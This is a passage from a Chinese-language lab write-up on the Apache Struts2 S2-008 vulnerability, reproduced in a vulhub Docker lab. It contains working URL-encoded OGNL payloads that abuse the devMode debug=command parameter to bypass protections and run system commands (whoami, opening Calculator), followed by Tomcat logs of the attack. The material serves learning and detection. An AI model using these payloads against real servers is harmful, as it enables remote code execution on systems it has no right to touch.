+&gt; S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。
+例如在 devMode 模式下直接添加参数`?debug=command&amp;expression=&lt;OGNL EXP&gt;`，会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）：
+​```
+http://localhost:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)
+​```   
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
+└─# docker-compose build
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
+└─# docker-compose up -d                                               1 ⨯
+Building with native build. Learn about native build in Compose here: https://docs.docker.com/go/compose-native-build/
+Creating network "s2-008_default" with the default driver
+Creating s2-008_struts2_1 ... done</code></pre>
+<h5 id="步骤二：攻击测试"><a href="#步骤二：攻击测试" class="headerlink" title="步骤二：攻击测试"></a>步骤二：攻击测试</h5><blockquote>
+<p>打开网页并开启hackbar,在hackbar下面加载url并添加payload,提交数据后便可以回显执行payload执行结果</p>
+</blockquote>
+<pre><code class="http">devmode.action?debug=command&amp;expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29</code></pre>
+<p><img src="https://s3.ax1x.com/2021/02/24/yOQFcn.png"></p>
+<h5 id="步骤三：日志分析-1"><a href="#步骤三：日志分析-1" class="headerlink" title="步骤三：日志分析"></a>步骤三：日志分析</h5><pre><code class="shell">┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
+└─# docker ps                                                                                               
+CONTAINER ID   IMAGE            COMMAND             CREATED         STATUS         PORTS                    NAMES
+563187af17b3   s2-008_struts2   "catalina.sh run"   7 minutes ago   Up 7 minutes   0.0.0.0:8080-&gt;8080/tcp   s2-008_struts2_1
+┌──(root💀kali)-[/home/laosec/vulhub/struts2/s2-008]
+└─# docker exec -it 563187af17b3 /bin/bash
+root@563187af17b3:/usr/local/tomcat# cd logs
+root@563187af17b3:/usr/local/tomcat/logs# cat localhost_access_log.2021-02-24.txt 
+192.168.0.104 - - [24/Feb/2021:03:39:10 +0000] "GET / HTTP/1.1" 200 389
+192.168.0.104 - - [24/Feb/2021:03:40:56 +0000] "GET /devmode.action?
+192.168.0.104 - - [24/Feb/2021:03:42:04 +0000] "GET /devmode.action?debug=command&amp;expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29 HTTP/1.1" 200 50061
+root@563187af17b3:/usr/local/tomcat/logs# </code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
